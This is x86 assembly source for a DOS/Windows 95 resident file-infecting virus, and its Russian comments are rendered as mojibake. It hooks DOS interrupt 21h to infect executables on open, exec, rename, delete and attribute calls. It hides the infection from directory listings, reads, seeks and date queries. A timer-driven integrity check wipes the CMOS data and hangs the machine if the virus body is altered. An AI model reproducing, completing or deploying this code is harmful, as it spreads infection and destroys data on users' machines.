    funcs        dw      1856h,tsrtest     ; ¯à®¢¥àª  § à ¦¥®áâ¨ ¯ ¬ïâ¨ (NULL)
                 dw      4AFFh,rehook      ; re-¯¥à¥å¢ â ¢¥ªâ®à  (SETBLOCK)

                 dw      3DFFh,infect      ; § à ¦¥¨¥ (OPEN)
                 dw      1857h,infect      ; § à ¦¥¨¥ (VIXFIRUS)
                 dw      41FFh,infect      ; § à ¦¥¨¥ (DEL)
                 dw      43FFh,infect      ; § à ¦¥¨¥ (CHMOD)
                 dw      4BFFh,infect      ; § à ¦¥¨¥ (EXEC)
                 dw      56FFh,infect      ; § à ¦¥¨¥ (REN)
                 dw      6C00h,extinfect   ; § à ¦¥¨¥ (EXTOPEN)
                 dw      7141h,infect      ; § à ¦¥¨¥ (LFN DEL)
                 dw      7143h,infect      ; § à ¦¥¨¥ (LFN CHMOD)
                 dw      7156h,infect      ; § à ¦¥¨¥ (LFN REN)
                 dw      716Ch,extinfect   ; § à ¦¥¨¥ (LFN OPEN)
                 dw      71A9h,extinfect   ; § à ¦¥¨¥ (LFN SERVER OPEN)

                 dw      11FFh,fcbstealth  ; áâ¥«á (FCB)
                 dw      12FFh,fcbstealth  ; áâ¥«á (FCB)
                 dw      4EFFh,dtastealth  ; áâ¥«á (DTA)
                 dw      4FFFh,dtastealth  ; áâ¥«á (DTA)
                 dw      714Eh,lfnstealth  ; áâ¥«á (LFN)
                 dw      714Fh,lfnstealth  ; áâ¥«á (LFN)
                 dw      71A6h,infstealth  ; áâ¥«á (LFN HANDLE INFO)
                 dw      5700h,date_get    ; áâ¥«á (GET DATE)
                 dw      5701h,date_set    ; áâ¥«á (SET DATE)
                 dw      42FFh,seekstealth ; áâ¥«á (LSEEK)
                 dw      3FFFh,readstealth ; áâ¥«á (READ)
                 dw      40FFh,diswrite    ; áâ¥«á (WRITE)

                 dw      3EFFh,patchsft    ; ª®àà¥ªâ¨à®¢ª  SFT
                 dw      44FFh,patchsft    ; ª®àà¥ªâ¨à®¢ª  SFT
                 dw      45FFh,patchsft    ; ª®àà¥ªâ¨à®¢ª  SFT
                 dw      46FFh,patchsft    ; ª®àà¥ªâ¨à®¢ª  SFT
                 dw      68FFh,patchsft    ; ª®àà¥ªâ¨à®¢ª  SFT
                 dw      0


   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Ž¡à ¡®âç¨ª ¯à¥àë¢ ¨ï 08 (Virus Guard)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    vguard:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           inc     cs:delay        ; ¯à®¢¥àª  ¡ã¤¥â ¯à®¨áå®¤¨âì ¯à¨¬¥à®
           cmp     cs:delay,18     ; ª ¦¤ãî á¥ªã¤ã
           jb      exit_guard
           mov     cs:delay,0
           call    crc             ; ¯®¤áç¥â CRC â¥«ï ¢¨àãá 
           cmp     cs:checksum,eax ; áà ¢¥¨¥ ¥¥ á íâ «®®©
           jz      crc_ok

           mov     ax,1681h        ; ®¡êï¢«¥¨¥  ç «  DOS Critical Session
           int     2fh             ;
           mov     al,0ffh         ; ª®âà®««¥à ¯à¥àë¢ ¨©:
           out     21h,al          ; § ¯à¥é¥¨¥ ¢á¥å  ¯¯ à âëå ¯à¥àë¢ ¨©

           mov     cx,40h          ; § â¨à ¥¬ ¤ ë¥ CMOS
    cmos:  mov     ax,cx
           out     71h,al
           out     70h,al
           loop    cmos
           jmp     $               ; ¢¥á¨¬ ¬ è¨ã

    crc_ok:
           mov     ax,1856h        ; ¯à®¢¥àï¥¬, ¨ªâ® «¨ ¥ ¢ëª¨¤ë¢ «  è
           int     21h             ; ®¡à ¡®âç¨ª 21-£® ¯à¥àë¢ ¨ï ¨§ ®¡é¥©
           cmp     ax,3265h        ; æ¥¯¨?
           je      exit_guard

           mov     ax,3521h        ; § ¯à®á ¢¥ªâ®à  int 21h
           int     21h
           call    set_dup         ; ãáâ ®¢¨âì 21-© ¢¥ªâ®à ¯à¥àë¢ ¨ï   ¤àã£®©
           lea     dx,manager      ; §¤¥áì ã¦® ¯¥à¥ãáâ ®¢¨âì ¢¥ªâ®à
           call    chk_dup         ;  å®¤¨¬ ¬¥áâ®, ªã¤  ãª §ë¢ « ¢¥ªâ®à
           jnz     reset           ; ¢ ¯®á«¥¤¨¥ £®¤ë á¢®¥© ¦¨§¨
           lea     dx,handler
    reset: mov     ax,2521h        ; ¯¥à¥ãáâ  ¢«¨¢ ¥¬ ¢¥ªâ®à
           mvs     ds,cs
           int     21h

    exit_guard:
           call    LoadRegs
           jmp     d cs:io08

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Ž¡à ¡®âç¨ª ¯à¥àë¢ ¨ï 21
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    handler:
           call    chk_dup         ; ¯à®¢¥àª , ¥ ¯¥à¥ãáâ ®¢¨«¨ «¨ ¢¥ªâ®à
           jz      manager         ; íâ® ¡ë¢ ¥â ¯®á«¥ § £àã§ª¨ Win95
           jmp     D cs:io21p      ; ¨ ç¥ ¬ë âãâ ¨ ¯à¨ ç¥¬

    manager:
           call    SaveRegs        ; á®åà ¨âì ¢á¥ à¥£¨áâàë

           mov     cs:save_ax,ax   ; á®®åà ¥¨¥ ¯ à ¬¥âà®¢
           mov     cs:save_bx,bx   ; ¡ã¤ãâ ¨á¯®«ì§®¢ âìáï (Filename), ¥á«¨
           mov     cs:save_es,es   ; äãªæ¨ï = 4b00 ¨ § ¯¯ãáª ¥¬ë© ä ©« - AV

           lea     si,funcs        ; ¥áâì â ¡«¨çª , ¯® ª®â®à®© ®¡à ¡ âë¢ îâáï
    fscan: cmp     ah,cs:[si+1]    ; ã¦ë¥ äãªæ¨¨ int 21 (dw F#, dw offset)
           jne     lnext           ; áà ¢¨¢ ¥¬ al á â¥ªãé¥© ïç¥©ª®© â ¡«¨æë
           cmp     B cs:[si],0ffh  ; ¯à®¢¥àª    ¥ã¦®áâì ¯à®¢¥àª¨ ¯®¤äãªæ¨¨
           je      ljump
           cmp     B cs:[si],al    ; ¯à®¢¥àª  ¯®¤äãªæ¨¨
           jne     lnext

    ljump: call    mcbcheck        ; äãªæ¨ï  ©¤¥ : ¯à®¢¥àª  MCB (¤«ï stealth)
           push    W cs:[si+2]     ; ¡¥à¥¬ á¬¥é¥¨¥ ®¡à ¡®âç¨ª  ¤«ï äãªæ¨¨
           jmp     LoadRegs        ; ¢®ááâ  ¢«¨¢ ¥¬ à¥£¨áâàë

    lnext: add     si,4            ; ¡¥à¥¬ á«¥¤ãîéãî § ¯¨áì ¨§ â ¡«¨æë
           cmp     w cs:[si],0     ; ¯à®¢¥àª  ª®æ  â ¡«¨æë
           jnz     fscan
           call    LoadRegs        ; ®¡à ¡®âç¨ª ¤«ï íâ®© äãªæ¨¨ â ª ¨ ¥
           jmp     ExitHandler     ;  ©¤¥: ®â¤ ¥¬ ã¯à ¢«¥¨¥

    exithandler:
           push    ax ax es bx bp  ; á®åà ¥¨¥ ES:BX ¨ à¥§¥à¢¨à®¢ ¨¥ ¬¥áâ 
           call    get_dup         ; ¯®«ãç¥¨¥ ®à¨£¨ «ì®£® ¢¥ªâ®à  int 21h
           mov     bp,sp
           mov     [bp+6],bx       ; § ®á ¢¥ªâ®à  ¢ ¤¢¥ á¢®¡®¤ë¥ ïç¥©ª¨
           mov     [bp+8],es       ; ¢ áâ¥ª¥
           pop     bp bx es        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢ ES:BX
           retf                    ; ¯¥à¥¤ ç  ã¯à ¢«¥¨ï DOS

    ireturn:
           retf    2               ; ¢®§¢à â á ã¨çâ®¦¥¨¥¬ ä« £®¢ ¢ áâ¥ª¥

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ‡ à ¦¥¨¥ ä ©«®¢
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    extinfect:
           call    SaveRegs        ; á®åà ¨âì ¢ áâ¥ª¥ à¥£¨áâàë
           mov     dx,si
           jmp     InfA
    infect:
           call    SaveRegs        ; á®åà ¨âì ¢ áâ¥ª¥ à¥£¨áâàë
    InfA:  call    Hook24          ; ãáâ ®¢ª  24-£® ¢¥ªâ®à  ¯à¥àë¢ ¨ï
           call    Filename        ; ¯à®¢¥àª  ¨¬¥¨ ¨ à áè¨à¥¨ï ä ©« 
           jc      noinf
           call    ClearFileAttributesA
           jc      noinf
           call    CreateFileA     ; ®âªàëâ¨¥ ä ©«  ¤«ï R/W
           jc      RAttr
           call    Infect_Handle   ; ¨ä¨æ¨à®¢ ¨¥ handle
           call    CloseFile       ; § ªàëâ¨¥ ä ©« 
    Rattr: call    RestoreFileAttributesA
    Noinf: call    Remove24        ; ¢®ááâ ®¢«¥¨¥ ®¡à ¡®âç¨ª  int 24h
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢

           cmp     ah,3dh          ; ¯à®¢¥àª    äãªæ¨î ®âªàëâ¨ï ä ©« 
           je      sftstealth      ; ¢ á«ãç ¥ ®âªàëâ¨ï ¨ä¨æ¨à®¢ ®£® ä ©« 
           cmp     ax,6c00h        ;  ¬ ¯® ¤®¡¨âáï ã¬¥ìè¨âì ¥£® ¤«¨ã
           je      sftstealth      ; ¢ SFT ¨ ®âª®àà¥ªâ¨à®¢ âì ¥£® ¤ âã
           cmp     ax,716ch        ;
           je      sftstealth      ;
           cmp     ax,71A9h        ;
           je      sftstealth      ;
           jmp     exithandler     ;

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; SFT stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    sftstealth:
           call    int21           ; ®âªàëâì ã¦ë© ä ©«
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           jc      no_sft
           xchg    ax,bx
           call    CloseSFT        ; § ªàëâì SFT
    no_sft:
           call    LoadRegs
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; FCB stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    fcbstealth:
           call    int21           ; ¢ë§¢ âì äãªæ¨î DOS
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           cmp     al,0ffh         ;  ©¤¥® çâ®-¨¡ã¤ì?
           jz      no_fcb
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_fcb

           mov     ah,2fh          ; § ¯à®á  ¤à¥á  DTA
           call    int21
           cmp     b es:[bx],0ffh  ; à áè¨à¥®¥ FCB?
           jne     usual
           add     bx,7
    usual: lea     si,[bx+19h]     ; si -> ¤ â  ä ©« 
           lea     di,[bx+1dh]     ; di -> ¤«¨  ä ©« 
           call    sizst           ; áªàëâ¨¥ «¨è¨å ¡ ©â
    no_fcb:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; DTA stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    dtastealth:
           call    int21           ; ¢ë§¢ âì äãªæ¨î DOS
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           jc      no_dta          ;  è«¨?
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_dta

           mov     ah,2fh          ; § ¯à®á  ¤à¥á  DTA
           call    int21
           lea     si,[bx+18h]     ; si -> ¤ â  ä ©« 
           lea     di,[bx+1ah]     ; di -> ¤«¨  ä ©« 
           call    sizst           ; áªàëâ¨¥ «¨è¨å ¡ ©â
    no_dta:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Win95 stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    infstealth:
           stc                     ; CF ¤®«¦¥ ¡ëâì ãáâ ®¢«¥
           call    int21           ; ¢ë§¢ âì äãªæ¨î DOS
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           jc      no_win          ; ¢á¥ ok?
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_win
           mov     ax,0            ; ¢à¥¬ï ¢ Win95 ä®à¬ â¥
           mov     si,dx
           lea     di,[si+24h]     ; à §¬¥à ä ©« 
           lea     si,[si+14h]     ; ¤ â  ä ©« 
           mvs     es,ds
           jmp     allw95

    lfnstealth:
           call    int21           ; ¢ë§¢ âì äãªæ¨î DOS
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           jc      no_win          ;  è«¨?
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_win
           mov     ax,si           ; ä®à¬ â ¢à¥¬¥¨
           lea     si,[di+14h]     ; ¤ â  ä ©« 
           lea     di,[di+20h]     ; à §¬¥à ä ©« 

    allw95:
           cmp     ax,1            ; ¯à®¢¥àª  ä®à¬ â  ¢à¥¬¥¨
           jz      dos_date

           push    si di ax        ; á®åà ¥¨¥ ¯ à ¬¥âà®¢   ¡ã¤ãîé¥¥
           mov     ax,71a7h        ; ¯¥à¥¢®¤ ¢à¥¬¥¨ ¨§ ä®à¬ â 
           mov     bl,0            ; Win95 ¢ ä®à¬ â DOS
           mvs     ds,es           ; SI ãª §ë¢ ¥â   ¤ âã
           call    int21           ; á¥©ç á CX:DX á®¤¥à¦ â ®¡ëç®¥ DOS ¢à¥¬ï
           pop     ax di si        ; ¢®ááâ ®¢«¥¨¥ ¯ à ¬¥âà®¢
           mov     [si],cx         ; á®åà ¥¨¥ ¯ à ¬¥âà®¢ ¢ FindDataRecord
           mov     [si+2],dx

    dos_date:
           add     si,2            ; si -> ¤ â  ä ©« 
           call    sizst           ; di -> ¤«¨  ä ©« 
           sub     si,2

           cmp     ax,1            ; ¯à®¢¥àª  ä®à¬ â  ¢à¥¬¥¨
           jz      no_win

           mov     ax,71a7h        ; ¯¥à¥¢®¤ ¢à¥¬¥¨ ¨§ ä®à¬ â 
           mov     bl,1            ; DOS ¢ ä®à¬ â Win95
           mov     di,si           ; DI -> buffer ¤«ï ¢à¥¬¥¨ ¨ ¤ âë
           mov     cx,[di]         ; çâ¥¨¥ ¢à¥¬¥¨ ¨ ¤ âë ¢ ä®à¬ â¥ DOS
           mov     dx,[di+2]
           call    int21           ; á¥©ç á ES:[DI] á®¤¥à¦¨â ¢à¥¬ï Win95

    no_win:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; DATE stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    date_get:
           call    OpenSFT         ; ®âªàëâì SFT
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_seek
           call    int21           ; § ¯à®á ¤ âë
           call    hidestm         ; ¬ áª¨à®¢ª  ¤ âë
           clc
           jmp     seek_ret

    date_set:
           call    OpenSFT         ; ®âªàëâì SFT
           call    int21           ; ãáâ ®¢ª  ¤ âë
           call    correctdate     ; ¯à ¢ª  ¤ âë
           jmp     seek_ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; LSEEK stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    seekstealth:
           call    OpenSFT         ; ®âªàëâì SFT
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_seek
           call    ioctl           ; ¯à®¢¥àª  ä ©«  IOCTL
           jc      no_seek
           call    Inf_Check       ; ¨ä¨æ¨à®¢ ?
           jnc     no_seek

           push    cx              ; á®åà ¥¨¥ CX
           cmp     al,2            ; ¯à®¢¥àª  â¨¯ 
           jne     forw
           sub     dx,vsize        ; ¬ áª¨à®¢ª   áâ®ïé¥£® ª®æ  ä ©« 
           sbb     cx,0            ; á¤¢¨£ ¨¤¥â ®â £®«®¢ë ¢¨àãá 
    forw:  call    int21           ; §¤¥áì ãáâ ®¢ª  ãª § â¥«ï ¨¤¥â ®â  ç « 
           pop     cx              ; ¢®ááâ ®¢«¥¨¥ CX
           jc      seek_ret        ; ¨«¨ ®â â¥ªãé¥© ¯®§¨æ¨¨
           call    seekhide        ; ¡«®ª¨à®¢ª  ¯®¯ ¤ ¨ï lseek   â¥«® ¢¨àãá 
           mov     ax,cs:seek_pos
           mov     dx,cs:seek_pos+2
           jmp     seek_ret

    no_seek:
           call    int21           ; ¢ë§®¢ DOS
    seek_ret:
           call    CloseSFT        ; § ªàëâì SFT
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; READ stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    readstealth:
           call    OpenSFT         ; ®âªàëâì SFT
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_seek
           call    ioctl           ; ¯à®¢¥àª  ä ©«  IOCTL
           jc      no_seek
           call    Inf_Check       ; ¨ä¨æ¨à®¢ ?
           jnc     no_seek

           call    SeekSave        ; á®åà ¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï
           call    int21           ; § ¯à®á çâ¥¨ï ¤ ëå
           jc      seek_ret
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     di,dx           ; ¤ã¡«¨à®¢ ¨¥ á¬¥é¥¨ï ¡ãä¥à 
           mov     cs:nrbytes,ax   ; ª®«¨ç¥áâ¢® ¯à®ç¨â ëå ¡ ©â

           cmp     d cs:seek_pos,32 ; ç¨â îâ § £®«®¢®ª?
           jae     zone
           call    crload          ; ¯à®ç¨â âì  áâ®ïé¥¥  ç «® ä ©« 

           lea     si,buffer       ; SI ->  áâ®ïé¥¥  ç «®
           add     si,cs:seek_pos  ; SI -> á ãç¥â¥¬ á¬¥é¥¨ï çâ¥¨ï

           mov     cx,cs:nrbytes   ; áç¨â ¥¬ ª®«¨ç¥áâ¢® ¡ ©â ª®â®àë¥  ¬ ã¦®
           add     cx,cs:seek_pos  ; á®áâ¥«á¨âì
           cmp     cx,32           ; ¯®§¨æ¨ï ª®æ  çâ¥¨ï «¥¦¨â §  ¯à¥¤¥«®¬
           jbe     $+5             ; á®åà ¥®£®  ç «  ä ©« ?
           mov     cx,32
           sub     cx,cs:seek_pos

           jcxz    zone            ; ¢ á«ãç ¥ çâ¥¨ï 0 ¡ ©â
    rhide: mov     al,cs:[si]      ; ¯®¤¬¥  ¨ä¨æ¨à®¢ ®£®  ç «  ä ©«   
           mov     [di],al         ; ®à¨£¨ «ì®¥
           inc     si
           inc     di
           loop    rhide

    zone:  call    seekhide        ; ¡«®ª¨àã¥¬ ¢®§¬®¦®áâì ¯®¯ ¤ ¨ï lseek  
           call    LoadRegs        ; §®ã ¢¨àãá  + ã¬¥ìè¥¨ï ç¨á«  ¯à®ç¨â ëå
           mov     ax,cs:nrbytes   ; ¡ ©â
           jmp     seek_ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ALL HANDLER stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    patchsft:
           call    OpenSFT         ; ®âªàëâì SFT
           jmp     no_seek

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; WRITE stealth
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    diswrite:
           call    OpenSFT         ; ®âªàëâì SFT
           cmp     cs:stf,0        ; à ¡®â âì ¬®¦®?
           jnz     no_seek
           call    ioctl           ; ¯à®¢¥àª  ä ©«  IOCTL
           jc      no_seek
           call    Inf_Check       ; ¨ä¨æ¨à®¢ ?
           jnc     no_seek

           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           call    SeekSave        ; á®åà ¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï
           mvs     ds,cs           ; DS=CS

           call    crload          ; § £àã§ª  ®à¨£¨ «ì®£®  ç «  ¢ ¡ãä¥à
           call    seek2bof        ; ¯®¬¥áâ¨âì ãª § â¥«ì ¢  ç «® ä ©« 
           mov     cx,32           ; § ¯¨áì ®à¨£¨ «ì®£® § £®«®¢ª  ä ©« 
           lea     dx,buffer
           call    write
           xor     cx,ax           ; ®è¨¡ª ? ã â®£¤  ¯à¨ § ¯¨á¨ â®£®,
           jnz     disfail         ; ç¥£® ¯à®áïâ ®è¨¡ª  ¡ã¤¥â â®¦¥!

           mov     cx,-1           ; ¤¢¨£ ¥¬áï ª £®«®¢¥ ¢¨àãá . â.¥.
           mov     dx,-vsize       ; ª ª®æã § à ¦¥®© ¯à®£à ¬¬ë
           call    seekfrom_eof
           mov     ah,40h          ; ®¡à¥§ ¥¬ ä ©«
           xor     cx,cx           ; ã¤ «ï¥¬ â¥«® ¢¨àãá  ¨§ ¢¨àãá®®á¨â¥«ï
           call    int21
           mov     ah,68h          ; á¡à áë¢ ¥¬ ¡ãä¥à 
           call    int21
    disfail:
           call    RestoreSeek     ; ¢®ááâ  ¢«¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï
           call    LoadRegs        ; ¢®ááâ  ¢«¥¨¥ à¥£¨áâà®¢
           jmp     no_seek         ; ¢ëå®¤¨¬

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯à®¢¥àª  ¨ä¨æ¨à®¢ ®áâ¨ ¯ ¬ïâ¨
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    tsrtest:
           mov     ax,3265h        ; Hi, AX=3265
           jmp     ireturn

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¢â®àë© ¯¥à¥å¢ â ¢¥ªâ®à  int 21h
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    rehook:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           call    chk_dup         ; ¯à®¢¥àª , ¡ë« «¨ ¢¥ªâ®à ã¦¥
           jnz     no_hook         ; ¯¥à¥ãáâ ®¢«¥
           call    WinOldAp        ; ¯à®¢¥àª , çâ®-¨¡ã¤ì ¨§¬¥¨«®áì á
           cmp     ax,cs:w95state  ; ¬®¬¥â  ¨áâ ««ïæ¨¨ ¢¨àãá  ¢ ¯ ¬ïâì
           jz      no_hook         ; (¡ë«  «¨ § £àã¦¥  Win95)

           mov     ax,3521h        ; ¯®«ãç¥¨¥ ¢¥ªâ®à  int 21h
           int     21h
           mov     ax,2521h        ; ãáâ ®¢ª  ®¢®£® ¢¥ªâ®à  ¯à¥àë¢ ¨ï
           lea     dx,manager
           mvs     ds,cs
           int     21h
           call    set_dup         ; á®åà ¥¨¥ ¢¥ªâ®à  ¢ ¤àã£®© ïç¥©ª¥ IVT
    no_hook:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           jmp     exithandler

   ; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ> SúUúBúRúOúUúTúIúNúEúS <ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; § £àã§ª  ¨ ¯¥à¥å¢ â ¢¥ªâ®à®¢ ¯à¥àë¢ ¨©
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    VectMan:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢

           mvs     ds,cs           ; ¨¨æ¨ «¨§ æ¨ï á¥£¬¥â®£® à¥£¨áâà 
           call    WinOldAp        ; ¯®«ãç¥¨¥ áâ âãá  ¨áâ ««ïæ¨¨ WinOldAp
           mov     w95state,ax     ; á®åà ¥¨¥ ä« ¦ª 

           mov     ax,3521h        ; AH=35 AL=INT# - äãªæ¨ï ¤«ï ¯®«ãç¥¨ï
           int     21h             ; ¢¥ªâ®à  ¯à¥àë¢ ¨ï AL
           mov     io21p,bx        ; á®åà ¨âì ¢¥ªâ®à ¢ ïç¥©ª¥ ¯ ¬ïâ¨
           mov     io21p+2,es
           call    set_dup         ; ãáâ ®¢¨âì 21-© ¢¥ªâ®à ¯à¥àë¢ ¨ï   ¤àã£®©
           mov     ax,2521h        ; ãáâ ®¢¨âì á¢®© ®¡à ¡®âç¨ª
           lea     dx,handler      ; ¯à¥àë¢ ¨ï
           int     21h
           mov     ax,3508h        ; § ¯à®á ¢¥ªâ®à  ¯à¥àë¢ ¨ï
           int     21h
           mov     io08,bx         ; á®åà ¥¨¥ ¢¥ªâ®à  ¢ ïç¥©ª å ¯ ¬ïâ¨
           mov     io08+2,es
           mov     ax,2508h        ; ãáâ ®¢ª  ¯à¥àë¢ ¨ï 08h (â ©¬¥à)
           lea     dx,vguard       ; ¤«ï ¯à®¢¥àª¨ æ¥«®áâ®áâ¨ ª®¤ 
           int     21h

           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ ¢¥ªâ®à®¢
           ret

    get_dup:
           push    ds si           ; § £àã§ª  à¥£¨áâà®¢ ES:BX ®à¨£¨ «ìë¬
           mvs     ds,0            ; ¢¥ªâ®à®¬ 21-£® ¯à¥àë¢ ¨ï
           mov     si,63h*4
           mov     bx,[si]
           mov     es,[si+2]
           pop     si ds
           ret

    set_dup:
           push    ds si           ; á®åà ¥¨¥ ES:BX ¢ 63-© ¢¥ªâ®à¥
           mvs     ds,0            ; ¯à¥àë¢ ¨ï
           mov     si,63h*4
           mov     [si],bx
           mov     [si+2],es
           pop     si ds
           ret

    chk_dup:
           push    ds si eax       ; ¯à®¢¥àª  ¨§¬¥¥¨¥ 63-£® ¢¥ªâ®à 
           mvs     ds,0            ; ¯à¥àë¢ ¨ï
           mov     si,63h*4
           mov     eax,[si]
           cmp     d cs:io21p,eax
           pop     eax si ds
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯à®¢¥àª   ªâ¨¢®áâ¨ Win95 (¨á¯®«ì§ãï WinOldAp)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    WinOldAp:
           mov     ax,1700h        ; äãªæ¨ï WinOldAp Installation Check
           int     2fh             ; ¯à®£à ¬¬ , ª®â®à ï ¯à¨áãâáâ¢ã¥â ¢ Win95
           ret                     ; ¢ 32-à §àï¤®¬ à¥¦¨¬¥ ¢ PE ä®à¬ â¥

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
